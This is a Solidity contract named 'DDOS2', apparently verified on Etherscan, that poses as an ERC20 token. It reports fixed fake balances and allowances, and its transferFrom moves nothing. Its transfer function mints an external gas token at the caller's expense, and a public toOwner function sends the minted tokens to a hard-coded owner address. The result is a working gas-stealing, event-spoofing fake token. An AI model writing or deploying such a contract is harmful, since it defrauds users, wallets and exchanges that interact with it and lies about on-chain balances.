/**
 *Submitted for verification at Etherscan.io on 2020-06-21
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Imint {
  function mint(uint256 value) external;
  function transfer(address recipient, uint256 amount) external returns (bool);
}

abstract contract ERC20Base is IERC20 {

  function totalSupply() public view override returns(uint256) {
    return 1000000000000000000000;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return 1000000000000000000000;
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return 1000000000000000000000;
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    emit Approval(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    emit Transfer(sender, recipient, amount);
    return true;
  }
}

contract DDOS2 is ERC20Base {
  string constant public name = "DDOS2";
  string constant public symbol = "DDOS2";
  uint8 constant public decimals = 0;
  Imint public constant chi = Imint(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
  address private _owner;

  constructor () public {
    _owner = 0xf0F8D1d90abb4Bb6b016A27545Ff088A4160C236;
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    chi.mint(amount);
    emit Transfer(msg.sender, recipient, amount);
    return true;
  }

  function toOwner(uint256 amount) public{
    chi.transfer(_owner,amount);
  }

  function to(address recipient) public returns (bool){
    emit Transfer(msg.sender, recipient, 1);
  }
}